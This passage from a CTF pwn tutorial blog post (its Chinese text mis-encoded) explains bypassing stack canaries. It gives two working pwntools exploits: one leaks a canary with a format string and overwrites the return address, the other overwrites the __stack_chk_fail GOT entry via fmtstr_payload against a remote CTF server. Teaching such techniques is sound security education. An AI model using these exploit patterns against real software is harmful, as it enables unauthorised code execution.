¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°23ï¼ˆ17+6ï¼‰ä¸ªå‚æ•°çš„è·ç¦»<br>å¯ä»¥åˆ©ç”¨%23$pæ¥leak canary<br><img src="27.png" alt=""><br>nice<br>æ¥ä¸‹æ¥å°±æŠŠcanaryå¡«å…¥rbp-8çš„ä½ç½®ç„¶året2textå°±å½³äºäº†</p>
<h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">'./Mary_Morton'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'3. Exit the battle'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.sendline(<span class="string">"%23$p"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">canary = int(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">"canary==&gt;"</span> + hex(canary))</span><br><span class="line">system = <span class="number">0x4008DA</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x88</span> + p64(canary) + p64(<span class="number">0xdeadbeef</span>) + p64(system)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="åŠ«æŒ-stack-chk-failå‡½æ•°"><a href="#åŠ«æŒ-stack-chk-failå‡½æ•°" class="headerlink" title="åŠ«æŒ__stack_chk_failå‡½æ•°"></a>åŠ«æŒ__stack_chk_failå‡½æ•°</h2><p>æ”¹å†™__stack_chk_fail@gotï¼Œä½†å‰ææ˜¯å¿…é¡»æœ‰ä¸€ä¸ªå¯ä»¥å‘ä»»æ„åœ°å€å†™çš„æ¼æ´ï¼Œä¾‹å¦‚è¯´æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´<br>è¿™ä¸ªæ–¹æ³•é€‚ç”¨äºåªèƒ½è¾“å…¥ä¸€æ¬¡çš„ç¨‹åºï¼Œå¦‚æœè¯´å¯ä»¥åˆ©ç”¨å¤šæ¬¡çš„è¯å°±å¯ä»¥åƒä¸Šé¢ä¸€æ ·ç›´æ¥æ³„éœ²canaryäº†</p>
<h3 id="ä¾‹é¢˜ï¼š-BJDCTF-2nd-r2t4"><a href="#ä¾‹é¢˜ï¼š-BJDCTF-2nd-r2t4" class="headerlink" title="ä¾‹é¢˜ï¼š[BJDCTF 2nd]r2t4"></a>ä¾‹é¢˜ï¼š[BJDCTF 2nd]r2t4</h3><p>ç¨‹åºæ¯”è¾ƒç®€å•ï¼Œåˆ†æä¸‹<br><img src="28.png" alt=""><br>å­˜åœ¨æº¢å‡ºå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æœ‰canary<br><img src="29.png" alt=""><br>æœ‰åé—¨<br>ç›´æ¥æ”¹å†™__stack_chk_fail@gotä¸ºbackdoor<br>è¿™ä¸ªé¢˜é™åˆ¶ä¸å¤šï¼Œå¯ä»¥ç›´æ¥ç”¨fmtstr_payloadæ¨¡å—ä¸€æŠŠæ¢­<br>å½“ç„¶ä¹Ÿå¯ä»¥æ‰‹åŠ¨æ„é€ <br>ä½†æ˜¯æˆ‘è¿˜æ²¡åšæ‰‹åŠ¨æ„é€ æ‰“çš„ï¼ˆæ‡’ğŸ•</p>
<h4 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28676</span>)</span><br><span class="line"><span class="comment">#p = process("./r2t4")</span></span><br><span class="line">elf = ELF(<span class="string">"./r2t4"</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">stack_check = <span class="number">0x601018</span></span><br><span class="line">flag_addr = <span class="number">0x400626</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;stack_check:flag_addr&#125;).ljust(<span class="number">40</span>,<span class="string">'a'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>ä»¥ä¸Šå°±æ˜¯æˆ‘å¯¹äºcanaryä¿æŠ¤çš„ç»•è¿‡å§¿åŠ¿çš„æ€»ç»“ï¼Œå¯èƒ½è¿˜æœ‰æˆ‘æš‚æ—¶æ²¡æœ‰æ¶‰åŠåˆ°çš„ï¼Œä¹Ÿæ¬¢è¿å¸ˆå‚…ä»¬æç‚¹æˆ‘ä¸€ä¸‹ï¼Œè¿™ç¯‡åšå®¢ä¹Ÿç®—æ˜¯å¤šå¤©æ²¡å­¦ä¹ ä»¥æ¥çš„ä¸€ä¸ªæ–°å¼€ç«¯å§<br>æ–‡ä¸­æ‰€æœ‰çš„ä¾‹é¢˜å’Œæˆ‘åšåˆ†äº«æ—¶çš„pptå·²ç»ä¸Šä¼ <a href="https://github.com/N0vice21/Bypass_canary_demo" target="_blank" rel="noopener">github</a></p>
<p>å‚è€ƒé“¾æ¥ï¼š<br><a href="https://p1kk.github.io/2019/10/26/canary%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/canary/" target="_blank" rel="noopener">https://p1kk.github.io/2019/10/26/canary%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/canary/</a><br><a href="https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/" target="_blank" rel="noopener">https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/</a><br><a href="https://ctf-wiki.org/pwn/linux/mitigation/canary/" target="_blank" rel="noopener">https://ctf-wiki.org/pwn/linux/mitigation/canary/</a></p>

      
    </div>
    
    
    

    

    
      <div>
        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
  <div>æ‚¨çš„é¼“åŠ±å°†æ”¯æŒæˆ‘ç»§ç»­åŠªåŠ›ï¼</div>
  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
    <span>æ‰“èµ</span>
  </button>
  <div id="QR" style="display: none;">

    
      <div id="wechat" style="display: inline-block">
        <img id="wechat_qr" src="/images/wechat.png" alt="N0vice å¾®ä¿¡æ”¯ä»˜"/>
        <p>å¾®ä¿¡æ”¯ä»˜</p>
      </div>
    

    
      <div id="alipay" style="display: inline-block">
        <img id="alipay_qr" src="/images/alipay.jpg" alt="N0vice æ”¯ä»˜å®"/>
        <p>æ”¯ä»˜å®</p>
      </div>
    

    

  </div>
</div>

      </div>
    

    
      <div>
        <ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>æœ¬æ–‡ä½œè€…ï¼š</strong>
    N0vice
  </li>
  <li class="post-copyright-link">
    <strong>æœ¬æ–‡é“¾æ¥ï¼š</strong>
    <a href="http://yoursite.com/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" title="Canaryä¿æŠ¤çš„6ç§ç»•è¿‡å§¿åŠ¿">http://yoursite.com/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/</a>
  </li>
  <li class="post-copyright-license">
    <strong>ç‰ˆæƒå£°æ˜ï¼š </strong>
    æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼
  </li>
</ul>

      </div>
    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/pwn/" rel="tag"># pwn</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2021/01/01/2020%E5%B9%B4%F0%9F%91%B4%E5%B9%B2%E4%BA%86%E4%BA%9B%E5%95%A5/" rel="next" title="2020å¹´ğŸ‘´å¹²äº†äº›å•¥">
                <i class="fa fa-chevron-left"></i> 2020å¹´ğŸ‘´å¹²äº†äº›å•¥
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2021/01/26/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93%EF%BC%88%E5%A1%AB%E5%9D%91%EF%BC%89/" rel="prev" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨æ€»ç»“ï¼ˆå¡«å‘ï¼‰">
                æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨æ€»ç»“ï¼ˆå¡«å‘ï¼‰ <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            æ–‡ç« ç›®å½•
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            ç«™ç‚¹æ¦‚è§ˆ
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/avatar.jpg"
                alt="N0vice" />
            
              <p class="site-author-name" itemprop="name">N0vice</p>
              <p class="site-description motion-element" itemprop="description">ä»å‰æˆ‘æ˜¯ççš„ï¼Œå¦‚ä»Šæˆ‘çœ‹å¾—è§</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">48</span>
                  <span class="site-state-item-name">æ—¥å¿—</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">æ ‡ç­¾</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/N0vice21" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://www.zhihu.com/people/luo-yu-piao" target="_blank" title="çŸ¥ä¹">
                      
                        <i class="fa fa-fw fa-zhihu"></i>çŸ¥ä¹</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://spacey.top/" title="Elli0t" target="_blank">Elli0t</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.ericdshen.com/" title="EDS" target="_blank">EDS</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://migraine-sudo.github.io" title="Migraine" target="_blank">Migraine</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://shawroot.cc/" title="Root" target="_blank">Root</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.yuque.com/pi3ntn/azmee3" title="Lime" target="_blank">Lime</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://mrbelieve128.github.io/" title="Mr.Believe" target="_blank">Mr.Believe</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://l0x1c.github.io/" title="L0x1c" target="_blank">L0x1c</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://binlep.top/" title="binlep" target="_blank">binlep</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://1p0ch.cn/" title="1p0ch" target="_blank">1p0ch</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://retr0.vip/" title="Retr_0" target="_blank">Retr_0</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.pwn4fun.com/" title="Railgun" target="_blank">Railgun</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://hackerpoet.com/" title="T4rn" target="_blank">T4rn</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.csdn.net/SopRomeo" title="penson" target="_blank">penson</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.cnblogs.com/lemon629/" title="lemon" target="_blank">lemon</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://surager.pub/" title="5ur4g3r" target="_blank">5ur4g3r</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.snowywar.top/" title="snowywar" target="_blank">snowywar</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Canaryä»‹ç»"><span class="nav-number">1.</span> <span class="nav-text">Canaryä»‹ç»</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#è¦†ç›–ä½å­—èŠ‚æ³„éœ²Canary"><span class="nav-number">2.</span> <span class="nav-text">è¦†ç›–ä½å­—èŠ‚æ³„éœ²Canary</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ä¾‹é¢˜ï¼šæ”»é˜²ä¸–ç•Œ-å¦é—¨é‚€è¯·èµ›pwn1"><span class="nav-number">2.1.</span> <span class="nav-text">ä¾‹é¢˜ï¼šæ”»é˜²ä¸–ç•Œ_å¦é—¨é‚€è¯·èµ›pwn1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#exp"><span class="nav-number">2.1.1.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Forkå­è¿›ç¨‹ç¨‹åºçˆ†ç ´canary"><span class="nav-number">3.</span> <span class="nav-text">Forkå­è¿›ç¨‹ç¨‹åºçˆ†ç ´canary</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ä¾‹é¢˜"><span class="nav-number">3.1.</span> <span class="nav-text">ä¾‹é¢˜</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#exp-1"><span class="nav-number">3.1.1.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSP-Stack-Smashing-Protect-Leak"><span class="nav-number">4.</span> <span class="nav-text">SSP(Stack Smashing Protect) Leak</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ä¾‹é¢˜ï¼šwdb2018-guess"><span class="nav-number">4.1.</span> <span class="nav-text">ä¾‹é¢˜ï¼šwdb2018_guess</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#exp-2"><span class="nav-number">4.1.1.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#warn"><span class="nav-number">4.1.2.</span> <span class="nav-text">warn</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ä¿®æ”¹TLSç»“æ„ä½“"><span class="nav-number">5.</span> <span class="nav-text">ä¿®æ”¹TLSç»“æ„ä½“</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ä¾‹é¢˜ï¼š-CTF2018-babystack"><span class="nav-number">5.1.</span> <span class="nav-text">ä¾‹é¢˜ï¼š*CTF2018 babystack</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#è°ƒè¯•è¿‡ç¨‹"><span class="nav-number">5.1.1.</span> <span class="nav-text">è°ƒè¯•è¿‡ç¨‹</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#æ•´ä½“æ€è·¯"><span class="nav-number">5.1.2.</span> <span class="nav-text">æ•´ä½“æ€è·¯</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp-3"><span class="nav-number">5.1.3.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²leak-canary"><span class="nav-number">6.</span> <span class="nav-text">æ ¼å¼åŒ–å­—ç¬¦ä¸²leak canary</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ä¾‹é¢˜ï¼šASIS-CTF-Finals-2017-Mary-Morton"><span class="nav-number">6.1.</span> <span class="nav-text">ä¾‹é¢˜ï¼šASIS-CTF-Finals-2017 Mary_Morton</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#exp-4"><span class="nav-number">6.1.1.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#åŠ«æŒ-stack-chk-failå‡½æ•°"><span class="nav-number">7.</span> <span class="nav-text">åŠ«æŒ__stack_chk_failå‡½æ•°</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ä¾‹é¢˜ï¼š-BJDCTF-2nd-r2t4"><span class="nav-number">7.1.</span> <span class="nav-text">ä¾‹é¢˜ï¼š[BJDCTF 2nd]r2t4</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#exp-5"><span class="nav-number">7.1.1.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">N0vice</span>

  
</div>


  <div class="powered-by">ç”± <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> å¼ºåŠ›é©±åŠ¨</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">ä¸»é¢˜ &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
